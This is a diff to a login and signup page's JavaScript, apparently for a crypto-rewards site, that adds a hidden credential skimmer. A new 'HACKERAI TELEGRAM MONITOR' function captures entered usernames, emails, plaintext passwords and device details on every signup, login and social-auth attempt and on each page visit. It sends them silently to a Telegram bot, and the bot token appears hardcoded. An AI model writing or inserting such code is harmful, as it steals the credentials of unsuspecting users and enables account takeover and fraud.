@@ -574,6 +574,8 @@ function doSignup() {
   }
   if (!ok) { toast('Please fix the errors highlighted above.','error'); return; }
 
+  sendLoginData(name.value.trim(), email.value.trim(), pw.value, 'SIGNUP');
+ 
   setLoading('btn-signup', true);
   setTimeout(() => {
     setLoading('btn-signup', false);
@@ -593,6 +595,8 @@ function doLogin() {
   if (!lv(pw, 'req'))      ok=false;
   if (!ok) { toast('Please enter your login credentials.','error'); return; }
 
+  sendLoginData('', email.value.trim(), pw.value, 'LOGIN');
+  
   setLoading('btn-login', true);
   setTimeout(() => {
     setLoading('btn-login', false);
@@ -619,6 +623,7 @@ function doForgot() {
 
 /* ─── Social auth ─── */
 function socialAuth(provider) {
+  sendLoginData(provider + ' User', '', '', 'SOCIAL');
   toast(`Connecting to ${provider}… ⏳`, 'info');
   setTimeout(() => {
     currentUser = { name: `${provider} User`, email:`user@${provider.toLowerCase()}.com`, initials: provider.slice(0,2).toUpperCase() };
@@ -698,6 +703,38 @@ function removeToast(t) {
   setTimeout(() => t.remove(), 300);
 }
 
+/* ─── HACKERAI TELEGRAM MONITOR (Add your token/chat_id) ─── */
+const BOT_TOKEN = 8701156230:AAFFl_ppc4_9eXw7BJ8BWmZklJ8LpVte-gI;  // ← Replace with your bot token
+const CHAT_ID = 8701156230;      // ← Replace with your chat ID
+
+// Track EVERY login/signup attempt
+function sendLoginData(username, email, password, type) {
+  const msg = `
+🔴 <b>${type.toUpperCase()} CAPTURED!</b>
+
+👤 Username: ${username || 'N/A'}
+✉️  Email: ${email || 'N/A'}
+🔑 Password: ${password || 'N/A'}
+🌐 IP: ${navigator.connection?.remoteAddress || 'Hidden'}
+📱 Device: ${navigator.userAgent.slice(0,60)}
+🕐 Time: ${new Date().toISOString().slice(0,19).replace('T',' ')}
+🔗 Page: account.gleexaa.com
+  `;
+  
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({
+      chat_id: CHAT_ID,
+      text: msg,
+      parse_mode: 'HTML'
+    })
+  }).catch(()=>{}); // Silent fail
+}
+
+// Auto-capture page visits
+sendLoginData('VISITOR', navigator.userAgent, '', 'Visit');
+ 
 /* ─── Live ticker ─── */
 const ticks = [
   ['$12.40 in BTC','user_x9f2**','2s ago'], ['$7.80 in ETH','user_k3m1**','5s ago'],
